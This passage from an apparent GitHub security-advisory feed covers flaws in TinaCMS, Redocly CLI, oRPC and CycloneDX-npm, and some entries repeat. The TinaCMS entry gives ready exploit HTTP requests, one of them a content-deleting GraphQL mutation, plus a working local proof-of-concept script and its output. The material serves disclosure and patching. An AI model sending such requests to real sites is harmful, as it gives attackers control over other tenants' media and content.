<p>I verified the full chain in source at the audited commit and reproduced the code logic deterministically with the PoC above. I did not run the end-to-end attack against production <code>identity.tinajs.io</code> with two real accounts and a live deployment; that step needs two real accounts and a deployment. The one assumption it rests on, that <code>GET /v2/apps/&lt;attacker-app&gt;/currentUser</code> with the attacker's own token returns <code>200</code> + <code>verified:true</code>, is the normal behavior of an app owner's own session.</p>
<h2 id="impact">Impact</h2>
<p>An attacker with a free TinaCloud account reaches editor-level control of unrelated tenants:</p>
<ul>
<li><strong>Media handlers:</strong> list and read media, upload arbitrary objects (<code>next-tinacms-dos</code> writes <code>ACL: public-read</code>, usable to host malware or phishing under the victim's CDN), and delete media by key.</li>
<li><strong><code>TinaCloudBackendAuthProvider</code> backend:</strong> arbitrary GraphQL. Read every document, <code>createDocument</code> / <code>updateDocument</code> to deface or inject content that deploys to production, and <code>deleteDocument</code> to destroy content.
The attacker scripts requests with their own token and <code>clientID=&lt;own app&gt;</code> against known TinaCMS self-hosted endpoints, so it scales across deployments.</li>
</ul>
<h2 id="fix">Fix</h2>
<p>Bind the decision to the site's own configured app id instead of the request value.</p>
<pre><code class="language-diff">- export const isAuthorized = async (req: NextApiRequest) =&gt; {
-   const clientID = req.query.clientID;
-   const token = req.headers.authorization;
+ export const isAuthorized = async (req: NextApiRequest, expectedClientID?: string) =&gt; {
+   const requestClientID = req.query.clientID;
+   const token = req.headers.authorization;
+   const clientID = expectedClientID ?? process.env.NEXT_PUBLIC_TINA_CLIENT_ID;
+   if (expectedClientID &amp;&amp; requestClientID &amp;&amp; requestClientID !== expectedClientID) {
+     return undefined; // refuse a cross-tenant clientID
+   }
    if (typeof clientID === 'string' &amp;&amp; typeof token === 'string') {
      return await isUserAuthorized({ clientID, token });
    }
    return undefined;
  };
</code></pre>
<p>Thread the site's configured <code>clientID</code> into <code>TinaCloudBackendAuthProvider()</code> and the media handler config, require <code>isUserAuthorized</code> to use it rather than <code>req.query.clientID</code>, apply the same change to <code>next-tinacms-azure/src/auth.ts</code>, and update the media-store READMEs so integrators stop reintroducing the request-driven <code>clientID</code>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/tinacms/tinacms/security/advisories/GHSA-g74q-6g2f-874x">https://github.com/tinacms/tinacms/security/advisories/GHSA-g74q-6g2f-874x</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-63506">https://nvd.nist.gov/vuln/detail/CVE-2026-63506</a></li>
<li><a href="https://github.com/tinacms/tinacms/pull/7168">https://github.com/tinacms/tinacms/pull/7168</a></li>
<li><a href="https://github.com/tinacms/tinacms/commit/0a927a4f8d228dd05ee7ca4be32899bc190e73af">https://github.com/tinacms/tinacms/commit/0a927a4f8d228dd05ee7ca4be32899bc190e73af</a></li>
<li><a href="https://github.com/tinacms/tinacms/releases/tag/@tinacms/auth@1.1.4">https://github.com/tinacms/tinacms/releases/tag/@tinacms/auth@1.1.4</a></li>
<li><a href="https://github.com/tinacms/tinacms/releases/tag/next-tinacms-azure@15.0.1">https://github.com/tinacms/tinacms/releases/tag/next-tinacms-azure@15.0.1</a></li>
<li><a href="https://github.com/advisories/GHSA-g74q-6g2f-874x">https://github.com/advisories/GHSA-g74q-6g2f-874x</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-g74q-6g2f-874x</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-09-17T14:59:00.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@tinacms/auth] Tina: [Broken Access Control] letting any TinaCloud user authorize against any self-hosted site]]></title>
        <id>https://github.com/advisories/GHSA-g74q-6g2f-874x</id>
        <link href="https://github.com/advisories/GHSA-g74q-6g2f-874x"/>
        <updated>2026-09-17T14:59:01.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p><code>@tinacms/auth</code>'s <code>isAuthorized(req)</code> decides authorization by validating the caller's bearer token against <code>https://identity.tinajs.io/v2/apps/${req.query.clientID}/currentUser</code>, where the <code>clientID</code> comes from the request and is never compared to the site's own configured TinaCloud app id. The function answers "is this token a verified user of whatever app the caller named?" instead of "is this token a verified user of THIS site?"</p>
<p>Any TinaCloud user can create their own free app, get a valid token for it, and send <code>?clientID=&lt;their-own-app&gt;</code> plus <code>Authorization: &lt;their-own-token&gt;</code> to a victim self-hosted site. The victim's <code>authorized</code> callback runs <code>const user = await isAuthorized(req); return user &amp;&amp; user.verified</code>, which returns <code>true</code>, and the victim authorizes the attacker.</p>
<p>The attacker holds no account on the victim and needs no victim interaction. With the media handlers this grants read, upload, and delete on the victim's media bucket. When the backend uses <code>TinaCloudBackendAuthProvider()</code> (the default the <code>tinacms init</code> wizard generates for TinaCloud auth), it grants full GraphQL read, write, and delete of the victim's content.</p>
<h2 id="affected-code-confirmed-at-5a6839f">Affected code (confirmed at <code>5a6839f</code>)</h2>
<p><code>packages/@tinacms/auth/src/index.ts:71-88</code> reads the <code>clientID</code> from the request:</p>
<pre><code class="language-ts">export const isAuthorized = async (req: NextApiRequest) =&gt; {
  const clientID = req.query.clientID;     // attacker-controlled
  const token = req.headers.authorization; // attacker-controlled
  if (typeof clientID === 'string' &amp;&amp; typeof token === 'string') {
    return await isUserAuthorized({ clientID, token });
  }
  return undefined;
};
</code></pre>
<p><code>index.ts:16-43</code> sends that caller-chosen <code>clientID</code> straight to the identity server, and returns the user on <code>200</code>:</p>
<pre><code class="language-ts">const tinaCloudRes = await fetch(
  `https://identity.tinajs.io/v2/apps/${clientID}/currentUser`,
  { headers: new Headers({ 'Content-Type': 'application/json', authorization: token }), method: 'GET' }
);
if (tinaCloudRes.ok) { return await tinaCloudRes.json(); }
</code></pre>
<p><code>index.ts:118-135</code> (<code>TinaCloudBackendAuthProvider</code>) gates only on <code>verified</code>, which reflects the attacker's own email verification:</p>
<pre><code class="language-ts">isAuthorized: async (req, _res) =&gt; {
  const user = await isAuthorized(req as NextApiRequest);
  if (user &amp;&amp; user.verified) return { isAuthorized: true };
  return { isAuthorized: false, errorCode: 401, errorMessage: 'Unauthorized' };
},
</code></pre>
<p>Every media-store README wires the same gate (<code>next-tinacms-cloudinary/README.md:113-122</code>, identical in <code>s3</code> and <code>dos</code>):</p>
<pre><code class="language-ts">authorized: async (req, _res) =&gt; {
  if (process.env.NEXT_PUBLIC_USE_LOCAL_CLIENT === '1') return true;
  const user = await isAuthorized(req);
  return user &amp;&amp; user.verified;   // no clientID === &lt;this site's app&gt; check
}
</code></pre>
<p>The bug is duplicated in <code>next-tinacms-azure/src/auth.ts:34-51</code> (<code>req.nextUrl.searchParams.get('clientID')</code>). Downstream nothing pins the site's <code>clientID</code>: <code>@tinacms/datalayer/src/backend/index.ts:201</code> gates on the boolean, and <code>next-tinacms-cloudinary/src/handlers.ts:36</code> returns 401 only when the callback is false. The <code>tinacms init</code> TinaCloud path ships this by default (<code>@tinacms/cli/.../prompts/authProvider.ts:17</code> -&gt; <code>TinaCloudBackendAuthProvider()</code>, used in <code>templates/tinaNextRoute.tsx:21-24</code> for every non-local deployment).</p>
<h2 id="steps-to-reproduce-real-target">Steps to reproduce (real target)</h2>
<p><strong>Setup:</strong> attacker has one free TinaCloud account with one app (<code>clientID = ATTACKER_APP</code>, token <code>T_attacker</code>) and no victim account. Victim is any self-hosted TinaCMS site using <code>@tinacms/auth</code>.</p>
<p>Media bucket (read; the same gate covers <code>POST</code> upload and <code>DELETE</code>):</p>
<pre><code>GET /api/cloudinary/media?clientID=ATTACKER_APP HTTP/1.1
Host: victim.example
Authorization: T_attacker
</code></pre>
<p>Content backend, when <code>TinaCloudBackendAuthProvider</code> is used:</p>
<pre><code>POST /api/tina/gql?clientID=ATTACKER_APP HTTP/1.1
Host: victim.example
Authorization: T_attacker
Content-Type: application/json
 
{"query":"mutation($c:String!,$r:String!){deleteDocument(collection:$c,relativePath:$r){__typename}}","variables":{"c":"post","r":"hello.md"}}
</code></pre>
<p><strong>Expected:</strong> 401/403 for a user with no access to <code>victim.example</code>.
<strong>Actual:</strong> 200, because authorization is bound to the attacker-supplied <code>clientID</code>.</p>
<h2 id="proof-of-concept-self-contained-zero-dependencies">Proof of concept (self-contained, zero dependencies)</h2>
<p>Save the file below as <code>poc.js</code> and run <code>node poc.js</code> (Node &gt;= 18). It runs the package's own <code>isAuthorized</code> / <code>isUserAuthorized</code> (TypeScript types removed; the hard-coded <code>identity.tinajs.io</code> base read from an env var so it points at a local identity model) behind the verbatim media-store <code>authorized</code> callback. The identity model scopes tokens to apps correctly and is not itself vulnerable; the bug is that the victim lets the caller choose which app to validate against.</p>
<pre><code class="language-js">/**
 * Self-contained PoC — @tinacms/auth cross-tenant authorization bypass
 * Audited commit: 5a6839f95ca60d1b9f4032a3bed1ae4a338a4787 (@tinacms/auth 1.1.3)
 *
 * Zero dependencies. Run with:  node poc.js   (Node &gt;= 18 for global fetch)
 *
 * The two functions below are copied from packages/@tinacms/auth/src/index.ts.
 * The ONLY changes are: TypeScript types removed, and the hard-coded
 * https://identity.tinajs.io base read from IDENTITY_BASE so it can point at the
 * local identity model. req.query.clientID, the currentUser call, and the
 * `user &amp;&amp; user.verified` gate are byte-for-byte the original logic.
 */
 
const http = require('http');
 
const IDENTITY_PORT = 18099;
const VICTIM_PORT = 19090;
process.env.IDENTITY_BASE = `http://127.0.0.1:${IDENTITY_PORT}`;
 
/* ===== verbatim from @tinacms/auth/src/index.ts (types stripped) ===== */
 
const isUserAuthorized = async (args) =&gt; {
  const clientID = args.clientID;
  const token = args.token;
  try {
    const tinaCloudRes = await fetch(
      `${process.env.IDENTITY_BASE || 'https://identity.tinajs.io'}/v2/apps/${clientID}/currentUser`,
      {
        headers: new Headers({ 'Content-Type': 'application/json', authorization: token }),
        method: 'GET',
      }
    );
    if (tinaCloudRes.ok) {
      const user = await tinaCloudRes.json();
      return user;
    }
    return;
  } catch (e) {
    console.error(e);
    throw e;
  }
};
 
const isAuthorized = async (req) =&gt; {
  const clientID = req.query.clientID;       // &lt;-- attacker-controlled
  const token = req.headers.authorization;   // &lt;-- attacker-controlled
  if (typeof clientID === 'string' &amp;&amp; typeof token === 'string') {
    return await isUserAuthorized({ clientID, token });
  }
  return undefined;
};
 
/* ===== identity model: a token grants access to the app its owner owns =====
   This is NOT the vulnerable part. It scopes tokens to apps correctly. The bug
   is that the victim lets the caller choose which app to validate against.     */
 
const TOKEN_FOR = {
  'victim-app': 'valid-token-for-victim-app',
  'attacker-app': 'valid-token-for-attacker-app',
};
const USER_FOR = {
  'victim-app': { id: 'u-victim', email: 'owner@victim.example', verified: true, role: 'admin' },
  'attacker-app': { id: 'u-attacker', email: 'attacker@evil.example', verified: true, role: 'admin' },
};
const identity = http.createServer((req, res) =&gt; {
  const m = req.url.match(/^\/v2\/apps\/([^/]+)\/currentUser$/);
  if (!m) { res.writeHead(404); return res.end('nf'); }
  const app = decodeURIComponent(m[1]);
  if (TOKEN_FOR[app] &amp;&amp; req.headers['authorization'] === TOKEN_FOR[app]) {
    res.writeHead(200, { 'Content-Type': 'application/json' });
    return res.end(JSON.stringify(USER_FOR[app]));
  }
  res.writeHead(401, { 'Content-Type': 'application/json' });
  return res.end(JSON.stringify({ message: 'unauthorized for this app' }));
});
 
/* ===== victim site (own clientID = victim-app), verbatim media-store README callback ===== */
 
const authorized = async (req) =&gt; {
  const user = await isAuthorized(req);
  return user &amp;&amp; user.verified;             // never checks req.query.clientID === victim-app
};
const victim = http.createServer(async (req, res) =&gt; {
  const u = new URL(req.url, `http://127.0.0.1:${VICTIM_PORT}`);
  req.query = Object.fromEntries(u.searchParams.entries());
  if (!u.pathname.startsWith('/api/cloudinary/media')) { res.writeHead(404); return res.end('nf'); }
  if (!(await authorized(req))) {
    res.writeHead(401, { 'Content-Type': 'application/json' });
    return res.end(JSON.stringify({ message: 'sorry this user is unauthorized' }));
  }
  res.writeHead(200, { 'Content-Type': 'application/json' });
  return res.end(JSON.stringify({ authorized: true, site: 'victim-app',
    media: ['victim/private/contract.pdf', 'victim/private/customers.csv'] }));
});
 
/* ===== driver ===== */
 
function call(clientID, token) {
  return new Promise((resolve) =&gt; {
    const r = http.request({ host: '127.0.0.1', port: VICTIM_PORT,
      path: `/api/cloudinary/media?clientID=${encodeURIComponent(clientID)}`,
      method: 'GET', headers: { authorization: token } }, (res) =&gt; {
      let b = ''; res.on('data', (c) =&gt; (b += c));
      res.on('end', () =&gt; resolve({ status: res.statusCode, body: b }));
    });
    r.on('error', (e) =&gt; resolve({ status: 0, body: String(e) })); r.end();
  });
}
 
(async () =&gt; {
  await new Promise((r) =&gt; identity.listen(IDENTITY_PORT, '127.0.0.1', r));
  await new Promise((r) =&gt; victim.listen(VICTIM_PORT, '127.0.0.1', r));
 
  const c1 = await call('victim-app', 'valid-token-for-victim-app');
  console.log('[CONTROL 1  legit victim user      ] clientID=victim-app   token=victim   -&gt;', c1.status, c1.body);
 
  const c2 = await call('victim-app', 'valid-token-for-attacker-app');
  console.log('[CONTROL 2  attacker token, victim ] clientID=victim-app   token=attacker -&gt;', c2.status, c2.body);
 
  const atk = await call('attacker-app', 'valid-token-for-attacker-app');
  console.log('[ATTACK     attacker own app+token ] clientID=attacker-app token=attacker -&gt;', atk.status, atk.body);
 
  const bug = c1.status === 200 &amp;&amp; c2.status === 401 &amp;&amp; atk.status === 200;
  console.log('\nVERDICT:', bug
    ? 'VULNERABLE — attacker authorized on victim site with credentials only for their own app.'
    : 'NOT REPRODUCED');
  identity.close(); victim.close();
  process.exit(bug ? 0 : 1);
})();
</code></pre>
<p>Output:</p>
<pre><code>[CONTROL 1  legit victim user      ] clientID=victim-app   token=victim   -&gt; 200 {"authorized":true,"site":"victim-app","media":[...]}
[CONTROL 2  attacker token, victim ] clientID=victim-app   token=attacker -&gt; 401 {"message":"sorry this user is unauthorized"}
[ATTACK     attacker own app+token ] clientID=attacker-app token=attacker -&gt; 200 {"authorized":true,"site":"victim-app","media":[...]}
 
VERDICT: VULNERABLE - attacker authorized on victim site with credentials only for their own app.
</code></pre>
<p>CONTROL 1 (200) shows the identity model is faithful, not a blanket allow. CONTROL 2 (401) shows the attacker cannot reach the victim's app with their own token. ATTACK (200) shows that naming their own app id, which their own token matches, passes the victim's gate and returns the victim's private media.</p>
<p>I verified the full chain in source at the audited commit and reproduced the code logic deterministically with the PoC above. I did not run the end-to-end attack against production <code>identity.tinajs.io</code> with two real accounts and a live deployment; that step needs two real accounts and a deployment. The one assumption it rests on, that <code>GET /v2/apps/&lt;attacker-app&gt;/currentUser</code> with the attacker's own token returns <code>200</code> + <code>verified:true</code>, is the normal behavior of an app owner's own session.</p>
<h2 id="impact">Impact</h2>
<p>An attacker with a free TinaCloud account reaches editor-level control of unrelated tenants:</p>
<ul>
<li><strong>Media handlers:</strong> list and read media, upload arbitrary objects (<code>next-tinacms-dos</code> writes <code>ACL: public-read</code>, usable to host malware or phishing under the victim's CDN), and delete media by key.</li>
<li><strong><code>TinaCloudBackendAuthProvider</code> backend:</strong> arbitrary GraphQL. Read every document, <code>createDocument</code> / <code>updateDocument</code> to deface or inject content that deploys to production, and <code>deleteDocument</code> to destroy content.
The attacker scripts requests with their own token and <code>clientID=&lt;own app&gt;</code> against known TinaCMS self-hosted endpoints, so it scales across deployments.</li>
</ul>
<h2 id="fix">Fix</h2>
<p>Bind the decision to the site's own configured app id instead of the request value.</p>
<pre><code class="language-diff">- export const isAuthorized = async (req: NextApiRequest) =&gt; {
-   const clientID = req.query.clientID;
-   const token = req.headers.authorization;
+ export const isAuthorized = async (req: NextApiRequest, expectedClientID?: string) =&gt; {
+   const requestClientID = req.query.clientID;
+   const token = req.headers.authorization;
+   const clientID = expectedClientID ?? process.env.NEXT_PUBLIC_TINA_CLIENT_ID;
+   if (expectedClientID &amp;&amp; requestClientID &amp;&amp; requestClientID !== expectedClientID) {
+     return undefined; // refuse a cross-tenant clientID
+   }
    if (typeof clientID === 'string' &amp;&amp; typeof token === 'string') {
      return await isUserAuthorized({ clientID, token });
    }
    return undefined;
  };
</code></pre>
<p>Thread the site's configured <code>clientID</code> into <code>TinaCloudBackendAuthProvider()</code> and the media handler config, require <code>isUserAuthorized</code> to use it rather than <code>req.query.clientID</code>, apply the same change to <code>next-tinacms-azure/src/auth.ts</code>, and update the media-store READMEs so integrators stop reintroducing the request-driven <code>clientID</code>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/tinacms/tinacms/security/advisories/GHSA-g74q-6g2f-874x">https://github.com/tinacms/tinacms/security/advisories/GHSA-g74q-6g2f-874x</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-63506">https://nvd.nist.gov/vuln/detail/CVE-2026-63506</a></li>
<li><a href="https://github.com/tinacms/tinacms/pull/7168">https://github.com/tinacms/tinacms/pull/7168</a></li>
<li><a href="https://github.com/tinacms/tinacms/commit/0a927a4f8d228dd05ee7ca4be32899bc190e73af">https://github.com/tinacms/tinacms/commit/0a927a4f8d228dd05ee7ca4be32899bc190e73af</a></li>
<li><a href="https://github.com/tinacms/tinacms/releases/tag/@tinacms/auth@1.1.4">https://github.com/tinacms/tinacms/releases/tag/@tinacms/auth@1.1.4</a></li>
<li><a href="https://github.com/tinacms/tinacms/releases/tag/next-tinacms-azure@15.0.1">https://github.com/tinacms/tinacms/releases/tag/next-tinacms-azure@15.0.1</a></li>
<li><a href="https://github.com/advisories/GHSA-g74q-6g2f-874x">https://github.com/advisories/GHSA-g74q-6g2f-874x</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-g74q-6g2f-874x</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-09-17T14:59:00.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@redocly/cli] Redocly CLI: Path traversal when using `split` command]]></title>
        <id>https://github.com/advisories/GHSA-657c-g7qc-r9j2</id>
        <link href="https://github.com/advisories/GHSA-657c-g7qc-r9j2"/>
        <updated>2026-09-17T14:58:52.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>An OpenAPI or AsyncAPI description could make the <code>split</code> command write
files outside the chosen output directory, on the machine of anyone who runs
<code>split</code> against it. The write is constrained rather than a free file-write
primitive: component data is emitted only as YAML/JSON, and code-sample files are
named after the HTTP method, so an attacker can place or overwrite files at an
unintended path but has limited control over their name and contents.</p>
<h3 id="patches">Patches</h3>
<p>Fixed in <code>@redocly/cli</code> v2.33.2.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Do not run the <code>split</code> command on API descriptions from untrusted or unreviewed sources.</p>
<p>To detect an exploit attempt, inspect the description's component names and
<code>x-codeSamples</code> <code>lang</code> values for a literal <code>../</code> — neither legitimately contains
path segments.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/Redocly/redocly-cli/security/advisories/GHSA-657c-g7qc-r9j2">https://github.com/Redocly/redocly-cli/security/advisories/GHSA-657c-g7qc-r9j2</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-63225">https://nvd.nist.gov/vuln/detail/CVE-2026-63225</a></li>
<li><a href="https://github.com/Redocly/redocly-cli/pull/2891">https://github.com/Redocly/redocly-cli/pull/2891</a></li>
<li><a href="https://github.com/Redocly/redocly-cli/pull/2923">https://github.com/Redocly/redocly-cli/pull/2923</a></li>
<li><a href="https://github.com/Redocly/redocly-cli/commit/26a0f299fae0b3bb7bd513043d2f1e90e69f79ee">https://github.com/Redocly/redocly-cli/commit/26a0f299fae0b3bb7bd513043d2f1e90e69f79ee</a></li>
<li><a href="https://github.com/Redocly/redocly-cli/commit/504120419a72b5c684471478337ee3b45d8bfad3">https://github.com/Redocly/redocly-cli/commit/504120419a72b5c684471478337ee3b45d8bfad3</a></li>
<li><a href="https://github.com/Redocly/redocly-cli/releases/tag/@redocly/cli@1.34.17">https://github.com/Redocly/redocly-cli/releases/tag/@redocly/cli@1.34.17</a></li>
<li><a href="https://github.com/Redocly/redocly-cli/releases/tag/@redocly/cli@2.33.2">https://github.com/Redocly/redocly-cli/releases/tag/@redocly/cli@2.33.2</a></li>
<li><a href="https://github.com/advisories/GHSA-657c-g7qc-r9j2">https://github.com/advisories/GHSA-657c-g7qc-r9j2</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-657c-g7qc-r9j2</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-09-17T14:58:50.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@redocly/cli] Redocly CLI: Path traversal when using `split` command]]></title>
        <id>https://github.com/advisories/GHSA-657c-g7qc-r9j2</id>
        <link href="https://github.com/advisories/GHSA-657c-g7qc-r9j2"/>
        <updated>2026-09-17T14:58:52.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>An OpenAPI or AsyncAPI description could make the <code>split</code> command write
files outside the chosen output directory, on the machine of anyone who runs
<code>split</code> against it. The write is constrained rather than a free file-write
primitive: component data is emitted only as YAML/JSON, and code-sample files are
named after the HTTP method, so an attacker can place or overwrite files at an
unintended path but has limited control over their name and contents.</p>
<h3 id="patches">Patches</h3>
<p>Fixed in <code>@redocly/cli</code> v2.33.2.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Do not run the <code>split</code> command on API descriptions from untrusted or unreviewed sources.</p>
<p>To detect an exploit attempt, inspect the description's component names and
<code>x-codeSamples</code> <code>lang</code> values for a literal <code>../</code> — neither legitimately contains
path segments.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/Redocly/redocly-cli/security/advisories/GHSA-657c-g7qc-r9j2">https://github.com/Redocly/redocly-cli/security/advisories/GHSA-657c-g7qc-r9j2</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-63225">https://nvd.nist.gov/vuln/detail/CVE-2026-63225</a></li>
<li><a href="https://github.com/Redocly/redocly-cli/pull/2891">https://github.com/Redocly/redocly-cli/pull/2891</a></li>
<li><a href="https://github.com/Redocly/redocly-cli/pull/2923">https://github.com/Redocly/redocly-cli/pull/2923</a></li>
<li><a href="https://github.com/Redocly/redocly-cli/commit/26a0f299fae0b3bb7bd513043d2f1e90e69f79ee">https://github.com/Redocly/redocly-cli/commit/26a0f299fae0b3bb7bd513043d2f1e90e69f79ee</a></li>
<li><a href="https://github.com/Redocly/redocly-cli/commit/504120419a72b5c684471478337ee3b45d8bfad3">https://github.com/Redocly/redocly-cli/commit/504120419a72b5c684471478337ee3b45d8bfad3</a></li>
<li><a href="https://github.com/Redocly/redocly-cli/releases/tag/@redocly/cli@1.34.17">https://github.com/Redocly/redocly-cli/releases/tag/@redocly/cli@1.34.17</a></li>
<li><a href="https://github.com/Redocly/redocly-cli/releases/tag/@redocly/cli@2.33.2">https://github.com/Redocly/redocly-cli/releases/tag/@redocly/cli@2.33.2</a></li>
<li><a href="https://github.com/advisories/GHSA-657c-g7qc-r9j2">https://github.com/advisories/GHSA-657c-g7qc-r9j2</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-657c-g7qc-r9j2</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-09-17T14:58:50.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@orpc/server] oRPC: Vary Header Injection in CORS Plugin leading to potential Cache/CORS Bypass]]></title>
        <id>https://github.com/advisories/GHSA-j9v4-rhgr-4m5f</id>
        <link href="https://github.com/advisories/GHSA-j9v4-rhgr-4m5f"/>
        <updated>2026-09-17T14:52:41.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>A flaw in the CORS plugin allowed the incoming request's <code>Vary</code> header to be reflected into the response, letting a client influence a header that should be controlled solely by the server.</p>
<h3 id="details">Details</h3>
<p>The CORS plugin previously copied the request's <code>Vary</code> header directly onto the response instead of treating <code>Vary</code> as a response-only header. Because <code>Vary</code> tells downstream caches and proxies how to key their cached responses, this allowed a client to inject arbitrary values into the response's <code>Vary</code> header, potentially distorting cache-key behavior in shared caches/CDNs sitting in front of an oRPC server and leading to inconsistent CORS enforcement for other clients.</p>
<p>Practical impact is limited to deployments where a shared cache or reverse proxy keys on the <code>Vary</code> header; the real-world effect depends on the caching layer's configuration.</p>
<h3 id="impact">Impact</h3>
<p>May cause cache key pollution and inconsistent CORS enforcement in setups that rely on shared/edge caches keying on <code>Vary</code>. No direct confidentiality, integrity, or availability impact in default (non-cached) configurations.</p>
<h3 id="resolution">Resolution</h3>
<p>Update <code>@orpc/server</code> (and any other <code>@orpc/*</code> packages bundling the CORS plugin) to <code>1.14.8</code>. The CORS plugin now derives <code>Vary</code> exclusively from the response, appending <code>Origin</code> and preserving existing values instead of reflecting request headers.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/middleapi/orpc/security/advisories/GHSA-j9v4-rhgr-4m5f">https://github.com/middleapi/orpc/security/advisories/GHSA-j9v4-rhgr-4m5f</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-77360">https://nvd.nist.gov/vuln/detail/CVE-2026-77360</a></li>
<li><a href="https://github.com/middleapi/orpc/issues/1661">https://github.com/middleapi/orpc/issues/1661</a></li>
<li><a href="https://github.com/middleapi/orpc/pull/1662">https://github.com/middleapi/orpc/pull/1662</a></li>
<li><a href="https://github.com/middleapi/orpc/commit/daabded122a89d323357c4c401e879701864cb2f">https://github.com/middleapi/orpc/commit/daabded122a89d323357c4c401e879701864cb2f</a></li>
<li><a href="https://github.com/middleapi/orpc/releases/tag/v1.14.8">https://github.com/middleapi/orpc/releases/tag/v1.14.8</a></li>
<li><a href="https://github.com/advisories/GHSA-j9v4-rhgr-4m5f">https://github.com/advisories/GHSA-j9v4-rhgr-4m5f</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-j9v4-rhgr-4m5f</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-09-17T14:52:37.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@cyclonedx/cyclonedx-npm] @cyclonedx/cyclonedx-npm: Shell Injection via Unsanitized --workspace Argument on Windows]]></title>
        <id>https://github.com/advisories/GHSA-q69g-4hcv-6jg4</id>
        <link href="https://github.com/advisories/GHSA-q69g-4hcv-6jg4"/>
        <updated>2026-09-17T14:50:42.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>A <strong>Windows-specific</strong> command injection vulnerability exists in <code>@cyclonedx/cyclonedx-npm</code> when the CLI is invoked with the <code>--workspace &lt;value&gt;</code> option.<br>User-supplied <code>--workspace</code> values can be passed to a shell command without proper neutralization on the Windows fallback execution path, enabling attackers to inject arbitrary OS commands.  </p>
<p>The vulnerability was fixed in version [6.0.0][v6.0.0].</p>
<h2 id="vulnerability-details">Vulnerability Details</h2>
<p>When <code>cyclonedx-npm</code> is executed with the <code>--workspace</code> option, the provided argument is incorporated into an internal command execution flow.<br>On <strong>Windows systems</strong>, this path can interpret untrusted <code>--workspace</code> input as shell syntax if not safely handled.</p>
<p>As a result, specially crafted workspace names can break out of the intended command context and execute arbitrary commands with the privileges of the invoking user.</p>
<h2 id="impact">Impact</h2>
<p>An attacker who can influence the value passed to <code>--workspace</code> can execute arbitrary OS commands <strong>on Windows hosts</strong>.<br>This may lead to:</p>
<ul>
<li>Arbitrary command execution</li>
<li>Data exfiltration</li>
<li>Local privilege escalation (depending on runtime context and privileges)</li>
<li>Modification or destruction of files accessible to the user running the CLI</li>
</ul>
<p>The vulnerability affects only scenarios where:</p>
<ul>
<li>The user invokes <code>cyclonedx-npm</code> with <code>--workspace &lt;value&gt;</code>, and</li>
<li>The vulnerable execution path is reached on <strong>Windows</strong>.</li>
</ul>
<h2 id="exploitation-conditions-high-level">Exploitation Conditions (High-Level)</h2>
<p>Exploitation requires the attacker to supply or influence the <code>--workspace</code> value passed to the CLI.<br>If the tool falls back to the vulnerable shell execution path on <strong>Windows</strong>, specially crafted workspace identifiers can cause unintended command execution.<br>No exploit code is included here to avoid providing weaponizable examples.</p>
<h2 id="root-cause">Root Cause</h2>
<p>The CLI fallback execution path on <strong>Windows</strong> constructed a shell command using untrusted input from the <code>--workspace</code> option.<br>Because the fallback code path does not sanitize or escape the workspace value, special shell metacharacters (e.g., <code>&gt;</code>, <code>&amp;</code>, <code>|</code>) are interpreted by the shell, enabling command injection.</p>
<h2 id="fix">Fix</h2>
<p>The vulnerability was resolved in [PR #1489], which ensures workspace values are handled safely and are no longer passed to a vulnerable shell execution path.</p>
<p>The fix is included in <code>@cyclonedx/cyclonedx-npm</code> version [6.0.0][v6.0.0].</p>
<h2 id="remediation">Remediation</h2>
<ul>
<li>Upgrade to version [6.0.0][v6.0.0] or later, which contains the complete fix.</li>
<li>As a temporary mitigation for older versions, ensure that the environment variable <code>npm_execpath</code> is set to a <code>npm-cli.js</code> before invoking the tool.</li>
<li>Avoid passing untrusted or user-controlled values to the <code>--workspace</code> option.</li>
<li>If immediate upgrade is not possible, prioritize mitigation on <strong>Windows systems</strong>, where exploitability exists.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/CycloneDX/cyclonedx-node-npm/security/advisories/GHSA-q69g-4hcv-6jg4">https://github.com/CycloneDX/cyclonedx-node-npm/security/advisories/GHSA-q69g-4hcv-6jg4</a></li>
<li><a href="https://github.com/CycloneDX/cyclonedx-node-npm/pull/1489">https://github.com/CycloneDX/cyclonedx-node-npm/pull/1489</a></li>
